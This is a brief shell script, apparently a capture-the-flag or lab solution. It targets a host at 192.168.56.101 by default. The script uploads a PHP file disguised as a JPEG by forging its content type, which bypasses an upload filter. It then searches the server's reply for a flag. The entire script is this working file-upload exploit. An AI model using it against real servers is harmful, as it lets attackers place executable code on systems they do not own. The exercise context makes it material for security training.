#!/bin/sh

ip="192.168.56.101" && [[ "$1" ]]  && ip="$1"

curl --silent -X POST -F 'Upload=Upload' -F 'uploaded=@empty.php;type=image/jpeg' "${ip}/?page=upload#" | grep "flag"
